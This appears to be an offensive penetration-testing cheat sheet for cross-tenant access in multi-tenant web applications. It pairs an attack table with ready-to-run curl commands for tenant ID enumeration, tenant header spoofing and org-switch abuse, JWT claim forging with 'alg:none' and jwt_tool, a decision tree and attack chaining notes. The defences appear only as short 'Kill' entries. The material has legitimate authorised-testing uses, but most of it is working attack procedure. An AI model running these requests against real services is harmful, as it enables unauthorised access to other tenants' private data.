# CROSS-TENANT ACCESS — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Tenant ID Swap** | org_id in URL/body | `curl /api/org/OTHER_TENANT/invoices -b "session=MY_TENANT"` | Tenant A reads Tenant B data | 403 not in tenant |
| **JWT Tenant Mod** | org_id in JWT | Decode JWT, change org_id, re-encode with `alg:none` | Tenant-switched access | Signature verified |
| **Invite to Tenant** | invite_user endpoint | `curl POST /api/org/invite -d '{"email":"user@other.com","org":"MY_ORG"}'` | External user added to org | "email not in domain" |
| **Switch Org** | switch_org feature | `curl X POST /api/org/switch -d '{"org_id":"OTHER"}'` | Session now in other org | Server re-validates membership |
| **Shared Resources** | Shared DB/prefix | `curl /api/items -H "X-Tenant: OTHER"` | Other tenant's items returned | Tenant header validated |

## CURL COMMANDS
```bash
# Tenant ID enumeration
for tenant in 1 2 3 4 5; do
  code=$(curl -s -o /tmp/tenant-$tenant.json -w "%{http_code}" \
    "/api/organizations/$tenant/users" -H "Cookie: A")
  count=$(jq '. | length' /tmp/tenant-$tenant.json 2>/dev/null || echo 0)
  echo "Tenant $tenant → $code ($count users)"
done

# JWT tampering
# Decode JWT, check for org_id/tenant_id claim
jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$JWT"
# If found: forge with alg=none
# jwt_tool JWT -X a -I -pc org_id -pv 2

# Cross-tenant data access
curl -s "/api/workspaces/2/projects" -H "Cookie: A" \
  -H "X-Tenant-Id: 2"  # Try to override tenant
```

## DECISION TREE
```
Found multi-tenant architecture?
├─ Can change tenant_id in URL/body?
│  ├─ Another tenant's data returned → CROSS-TENANT IDOR
│  └─ 403 → membership check
├─ Can modify JWT claims (org_id/tenant)?
│  ├─ Yes → JWT TENANT HOPPING (change claim, access all tenants)
│  └─ No → JWT signature verified
├─ Can invite external user to tenant?
│  ├─ External added → TENANT INGRESS
│  └─ Domain restriction → valid org control
└─ Shared resources accessible via tenant header?
   ├─ Yes → TENANT HEADER SPOOFING
   └─ No → server uses session tenant
```

## CHAIN
Cross-Tenant + IDOR = Access all resources in all tenants
Cross-Tenant + Admin Escalation = Global admin across tenants
